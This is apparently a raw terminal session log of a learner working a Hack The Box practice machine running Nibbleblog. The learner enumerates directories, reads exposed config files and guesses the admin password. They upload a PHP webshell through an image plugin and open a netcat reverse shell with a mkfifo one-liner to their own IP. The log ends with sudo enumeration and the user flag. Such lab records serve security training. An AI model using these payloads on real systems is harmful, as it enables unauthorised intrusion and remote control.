@@ -1,0 +1,208 @@
+Script started on 2024-12-28 14:03:57-05:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="80" LINES="24"]
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mCAT[K[K[Kcatexit[1Pcat S[KWeb_Foothold_28-12-2024.log 
+[?2004l]0;cat Web_Foothold_28-12-2024.log - Parrot TerminalScript started on 2024-12-28 13:42:34-05:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="190" LINES="35"]
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mta=[K[K[Kecho "target = "[7m<?php system('id'); ?>[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C<?php system('id'); ?>
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[C[7m10.129.229.233[27m"10.129.229.233"
+[?2004l]0;echo "target = 10.129.229.233" - Parrot Terminaltarget = 10.129.229.233
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mcurl [7m10.129.229.233[27m[C[C[C[C[C[C[C[C[C[C[C10.129.229.233
+[?2004l]0;curl 10.129.229.233 - Parrot Terminal<b>Hello world!</b>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mcurl [7m10.129.229.233[27m[C[C[C[C[C[C[C[C[C[C[C10.129.229.233[C/nibbleblog
+[?2004l]0;curl 10.129.229.233/nibbleblog - Parrot Terminal<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.129.229.233/nibbleblog/">here</a>.</p>
+<hr>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.129.229.233 Port 80</address>
+</body></html>
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mgobuster -w [C[1@ [1@d[1@i[1@r[C[C[C[Chttp://[7m10.129.229.233[27m10.129.229.233/nibbleblog [K.[K/ -w [1P[1@u[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/usr/share/seclists/Discovery/Web-Contetn[K[Knt/common.txt
+[?2004l]0;gobuster dir -u http://10.129.229.233/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt - Parrot Terminal===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.229.233/nibbleblog/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+[2K/.htaccess           [33m (Status: 403)[0m [Size: 309]
+[2K/.htpasswd           [33m (Status: 403)[0m [Size: 309]
+[2K/.hta                [33m (Status: 403)[0m [Size: 304]
+[2KProgress: 262 / 4724 (5.55%)[2K/README              [32m (Status: 200)[0m [Size: 4628]
+[2K/admin               [36m (Status: 301)[0m [Size: 327][34m [--> http://10.129.229.233/nibbleblog/admin/][0m
+[2K/admin.php           [32m (Status: 200)[0m [Size: 1401]
+[2KProgress: 568 / 4724 (12.02%)[2KProgress: 875 / 4724 (18.52%)[2KProgress: 1193 / 4724 (25.25%)[2K/content             [36m (Status: 301)[0m [Size: 329][34m [--> http://10.129.229.233/nibbleblog/content/][0m
+[2KProgress: 1549 / 4724 (32.79%)[2KProgress: 1735 / 4724 (36.73%)[2KProgress: 1735 / 4724 (36.73%)[2KProgress: 1775 / 4724 (37.57%)[2KProgress: 2115 / 4724 (44.77%)[2K/index.php           [32m (Status: 200)[0m [Size: 2987]
+[2K/languages           [36m (Status: 301)[0m [Size: 331][34m [--> http://10.129.229.233/nibbleblog/languages/][0m
+[2KProgress: 2445 / 4724 (51.76%)[2KProgress: 2744 / 4724 (58.09%)[2KProgress: 3086 / 4724 (65.33%)[2K/plugins             [36m (Status: 301)[0m [Size: 329][34m [--> http://10.129.229.233/nibbleblog/plugins/][0m
+[2KProgress: 3424 / 4724 (72.48%)[2KProgress: 3767 / 4724 (79.74%)[2KProgress: 4094 / 4724 (86.66%)[2K/themes              [36m (Status: 301)[0m [Size: 328][34m [--> http://10.129.229.233/nibbleblog/themes/][0m
+[2KProgress: 4434 / 4724 (93.86%)[2KProgress: 4723 / 4724 (99.98%)
+===============================================================
+Finished
+===============================================================
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho [K ""a"d"m"i"n" "[1P"."p"h"p" "i"s" "a" "l"o"g"i"n" "p"a"g"e"." "w"e" "c"h"e"c"k" "[1P"o"u"t" "a"l"l" "t"h"e" "f"i"l"e"s" "[1P"[1P"[1P"[1P"[1P"[1P"l"i"n"k"s" "a"n"d" "r"e"t"u"r"n" "[1P"[1P"[1P"[1P"[1P"[1P"[1P"e"v"e"n"t"u"a"l"l"y" "w"e" "w"i"l"l" "f"i"n"d" "t"h"e" "u"s"e"r"n"a"m"e" "i"s" "a"d"m"i"n" "f"r"o"m" "/"c"o"n"t"e"t"n"[1P"[1P"n"t"/"p"r"i"v"a"t"e"/" "[1P"u"s"e"r"s"."x"m"l"
+[?2004l]0;echo "admin.php is a login page. we checkout all the links and eventually we will find the username is admin from /content/private/users.xml" - Parrot Terminaladmin.php is a login page. we checkout all the links and eventually we will find the username is admin from /content/private/users.xml
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho "admin.php is a login page. we checkout all the links and eventually we will find the username is admin from /content/private/users.xml"[C[C[C[C[C[C[36Pgobuster dir -u http://10.129.229.233/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt[C[C[C[C[C[Ccurl 10.129.229.233/nibbleblog[K/content.[K/private.[K/users.xml
+[?2004l]0;curl 10.129.229.233/nibbleblog/content/private/users.xml - Parrot Terminal<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<users><user username="admin"><id type="integer">0</id><session_fail_count type="integer">0</session_fail_count><session_date type="integer">1735411232</session_date></user><blacklist type="string" ip="10.10.10.1"><date type="integer">1512964659</date><fail_count type="integer">1</fail_count></blacklist><blacklist type="string" ip="10.10.15.253"><date type="integer">1735411164</date><fail_count type="integer">1</fail_count></blacklist></users>
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexh[K[Kcho ""n"e"x"t" "w"e" "g"u"e"s"s" "t"h"e" "p"a"s"s"w"o"r"d" "f"r"o"m" "/"c"o"n"t"e"n"t"/"u"s"e"r"[1P"[1P"[1P"[1P"p"r"i"v"a"t"e"/"c"o"n"f"i"g"."x"m"l" "t"o" "b"e" "n"i"b"b"l"e"s" "a"n"d" "f"r"o"m" "t"h"e" "w"e"b"s"i"t"e" "h"e"l"p"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"H"T"B" "g"u"i"d"e"[C
+[?2004l]0;echo "next we guess the password from /content/private/config.xml to be nibbles and from the HTB guide" - Parrot Terminalnext we guess the password from /content/private/config.xml to be nibbles and from the HTB guide
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mcecho "next we guess the password from /content/private/config.xml to be nibbles and from the HTB guide"[C[C[C[C[C[C[47Pcurl 10.129.229.233/nibbleblog/content/private/users.xml[K[K[K[K[K[K[K[K[Kconfig.xml
+[?2004l]0;curl 10.129.229.233/nibbleblog/content/private/config.xml - Parrot Terminal<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<config><name type="string">Nibbles</name><slogan type="string">Yum yum</slogan><footer type="string">Powered by Nibbleblog</footer><advanced_post_options type="integer">0</advanced_post_options><url type="string">http://10.10.10.134/nibbleblog/</url><path type="string">/nibbleblog/</path><items_rss type="integer">4</items_rss><items_page type="integer">6</items_page><language type="string">en_US</language><timezone type="string">UTC</timezone><timestamp_format type="string">%d %B, %Y</timestamp_format><locale type="string">en_US</locale><img_resize type="integer">1</img_resize><img_resize_width type="integer">1000</img_resize_width><img_resize_height type="integer">600</img_resize_height><img_resize_quality type="integer">100</img_resize_quality><img_resize_option type="string">auto</img_resize_option><img_thumbnail type="integer">1</img_thumbnail><img_thumbnail_width type="integer">190</img_thumbnail_width><img_thumbnail_height type="integer">190</img_thumbnail_height><img_thumbnail_quality type="integer">100</img_thumbnail_quality><img_thumbnail_option type="string">landscape</img_thumbnail_option><theme type="string">simpler</theme><notification_comments type="integer">1</notification_comments><notification_session_fail type="integer">0</notification_session_fail><notification_session_start type="integer">0</notification_session_start><notification_email_to type="string">admin@nibbles.com</notification_email_to><notification_email_from type="string">noreply@10.10.10.134</notification_email_from><seo_site_title type="string">Nibbles - Yum yum</seo_site_title><seo_site_description type="string"/><seo_keywords type="string"/><seo_robots type="string"/><seo_google_code type="string"/><seo_bing_code type="string"/><seo_author type="string"/><friendly_urls type="integer">0</friendly_urls><default_homepage type="integer">0</default_homepage></config>
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mnext[K[K[K[Kecho "as we surf the website we see a [K[K[K[K[K[Knotice we can uploasd a file in themes[K[K[K[K[K[Kplugind[Ks->images->upload[K[K[K[K[K[K[K[K[K[K[K[K[K[Kmy image ->configureA[K"
+[?2004l]0;echo "as we surf the website we notice we can uploasd a file in plugins->my image ->configure" - Parrot Terminalas we surf the website we notice we can uploasd a file in plugins->my image ->configure
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho "we cer[K[Kreate a file called[K[K[K[K[K[Kan d[K[Kd put thie[Ks code in it[C[1@ [1@p[1@h[1@p[C[C[C[C[C[C[C[C[C[C[C [7m<?php system('id'); ?>[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C<?php system('id'); ?>"
+[?2004l]0;echo "we create a file and put this php code in it <?php system('id'); ?>" - Parrot Terminalwe create a file and put this php code in it <?php system('id'); ?>
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho ""a"n"d" "u"p"l"o"a"d" "i"y"t"[1P"[1P"t"
+[?2004l]0;echo "and upload it" - Parrot Terminaland upload it
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho ""w"e" "n"o"t"i"c"e" "c"h"a"n"g"e"s" "i"n" "/"c"o"n"t"e"n"t"/"p"r"i"v"a"t"e"[C "f"r"o"m" "t"h"e" "d"a"t"e"
+[?2004l]0;echo "we notice changes in /content/private from the date" - Parrot Terminalwe notice changes in /content/private from the date
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho "we notice changes in /content/private from the date"[C[C[C[C[C[C[C[C[C[C[C[Cand upload it"[K[C[C[C[C[C[C[C[C[C[C[C[Cwe create a file and put this php code in it <?php system('id'); ?>"[C[C[C[C[C[C[C[C[C[C[C[Cas we surf the website we notice we can uploasd a file in plugins->my image ->configure"[C[C[C[C[C[C[37Pcurl 10.129.229.233/nibbleblog/content/private/config.xml[C[C[C[C[C[Cecho "next we guess the password from /content/private/config.xml to be nibbles and from the HTB guide"[C[C[C[C[C[C[46Pcurl 10.129.229.233/nibbleblog/content/private/config.xml[C[K[K[K[K[K[K[K[K[K[Kplugins/my_image/image.php
+[?2004l]0;curl 10.129.229.233/nibbleblog/content/private/plugins/my_image/image.php - Parrot Terminaluid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip a
+[?2004l]0;ip a - Parrot Terminal1: [36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [33m00:00:00:00:00:00[0m brd [33m00:00:00:00:00:00[0m
+    inet [35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [34m::1[0m/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: [36menp0s3: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state [32mUP [0mgroup default qlen 1000
+    link/ether [33m08:00:27:ad:9a:ea[0m brd [33mff:ff:ff:ff:ff:ff[0m
+    inet [35m10.0.2.15[0m/24 brd [35m10.0.2.255 [0mscope global dynamic noprefixroute enp0s3
+       valid_lft 78741sec preferred_lft 78741sec
+    inet6 [34mfe80::a41d:9231:fdc:39e3[0m/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+5: [36mtun0: [0m<POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet [35m10.10.15.253[0m/23 brd [35m10.10.15.255 [0mscope global noprefixroute tun0
+       valid_lft forever preferred_lft forever
+    inet6 [34mdead:beef:2::11fb[0m/64 scope global noprefixroute 
+       valid_lft forever preferred_lft forever
+    inet6 [34mfe80::c09a:bc99:d0a6:7523[0m/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mim[K[Kecho "we make a new shell file o[Kto gain a remote connection [7m<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>[27m
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C"
+[?2[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[K[0;31m└──╼ [0m[01;33m$[0mecho "we use our attacker ip [7m0.10.10.15.253 [27m0.10.10.15.253 [C[1@1[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cand our[K[K[Kport 9443" "a"n"d" "t"h"e"n" "l"i"s"t"e"n" "u"s"i"n"g" "n"e"t"c"a"t" "[1P"," "i" "w"i"l"l" "c"u"r"l" "t"h"e" "l"i"n"k" "i"n" "a"n"o"t"h"e"r" "t"e"r"n"[1P"m"i"n"a"l"[1@/[1@ [C[1@i[1@m[1@a[1@g[1@e[1@.[1@p[1@h[1@p
+[?2004l]0;echo "we use our attacker ip 10.10.10.15.253 and port 9443 and then listen using netcat, i will curl the link /image.php in another terminal" - Parrot Terminalwe use our attacker ip 10.10.10.15.253 and port 9443 and then listen using netcat, i will curl the link /image.php in another terminal
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0ml[Knc -lvnp 9443
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho ""m"y" "b"a"d" "n"e"e"d" "t"o" "c"h"a"n"g"e" "m"y" "[1P"[1P"[1P"t"h"e" "i"p" "c"a"u"s"e" "i" "h"a"d" "c"h"a"[1P"[1P"[1P"r"e"c"o"n"n"e"c"t"e"d" "v"p"n"
+[?2004l]0;echo "my bad need to change the ip cause i had reconnected vpn" - Parrot Terminalmy bad need to change the ip cause i had reconnected vpn
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip a
+[?2004l]0;ip a - Parrot Terminal1: [36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [33m00:00:00:00:00:00[0m brd [33m00:00:00:00:00:00[0m
+    inet [35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [34m::1[0m/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: [36menp0s3: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state [32mUP [0mgroup default qlen 1000
+    link/ether [33m08:00:27:ad:9a:ea[0m brd [33mff:ff:ff:ff:ff:ff[0m
+    inet [35m10.0.2.15[0m/24 brd [35m10.0.2.255 [0mscope global dynamic noprefixroute enp0s3
+       valid_lft 78038sec preferred_lft 78038sec
+    inet6 [34mfe80::a41d:9231:fdc:39e3[0m/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+6: [36mtun0: [0m<POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet [35m10.10.15.253[0m/23 brd [35m10.10.15.255 [0mscope global noprefixroute tun0
+       valid_lft forever preferred_lft forever
+    inet6 [34mdead:beef:2::11fb[0m/64 scope global noprefixroute 
+       valid_lft forever preferred_lft forever
+    inet6 [34mfe80::40f8:cab9:3bfc:925e[0m/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip aecho "my bad need to change the ip cause i had reconnected vpn"[C[C[C[C[C[Cnc -lvnp 9443[K
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+connect to [10.10.15.253] from (UNKNOWN) [10.129.229.233] 34150
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+db.xml
+image.php
+$ cd ..
+$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+/bin/sh: 4: python: not found
+$ ^[[A^[[B        which python3
+/usr/bin/python3
+$ ^[[A^[[A        python -c 'import pty; pty.spawn("/bin/bash")'^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D                                                         '                                        3 -c 'import pty; pty.spawn("bin    "/bin? /bash")'
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins$ ls
+ls
+categories  hello  latest_posts  my_image  pages
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins$ cd ..
+cd ..
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private$ cd  ls
+ls
+categories.xml	config.xml  notifications.xml  plugins	  shadow.php  users.xml
+comments.xml	keys.php    pages.xml	       posts.xml  tags.xml
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private$ cd /home
+cd /home
+nibbler@Nibbles:/home$ ls
+ls
+nibbler
+nibbler@Nibbles:/home$ cd nibbler
+cd nibbler
+nibbler@Nibbles:/home/nibbler$ ls
+ls
+personal.zip  user.txt
+nibbler@Nibbles:/home/nibbler$ cat usr er.txt
+cat user.txt
+79c03865431abf47b90ef24b9695e148
+nibbler@Nibbles:/home/nibbler$ exit
+exit
+exit
+$ exit
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Web_Foothold[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit
+[?2004l]0;exit - Parrot Terminalexit
+
+Script done on 2024-12-28 14:16:02-05:00 [COMMAND_EXIT_CODE="0"]
